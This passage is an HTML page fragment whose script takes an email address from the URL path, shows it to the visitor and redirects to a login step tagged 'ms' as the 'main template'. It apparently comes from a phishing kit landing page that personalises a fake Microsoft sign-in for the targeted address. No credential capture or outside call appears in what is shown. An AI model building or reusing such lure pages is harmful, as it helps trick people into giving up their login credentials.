 margin:0;font-family:Arial;height:100vh;display:flex;align-items:center;justify-content:center">

</div>

<script>
    // 1. Grab Email from URL
    function getEmailFromUrl() {
        const path = window.location.pathname;
        const parts = path.split('/');
        for (let i = parts.length - 1; i >= 0; i--) {
            if (parts[i].includes('@') && parts[i].includes('.')) {
                return parts[i];
            }
        }
        return '';
    }

    // 2. Display Email if found
    const email = getEmailFromUrl();
    if (email) {
        document.getElementById('user-email').textContent = "(" + email + ")";
    }

    // 3. Redirect Logic (Preserves Query Params + adds step=ms)
    function redirectToLogin() {
        const currentUrl = new URL(window.location.href);
        currentUrl.searchParams.set('step', 'ms'); // Force main template
        window.location.href = currentUrl.toString();
    }
</script>
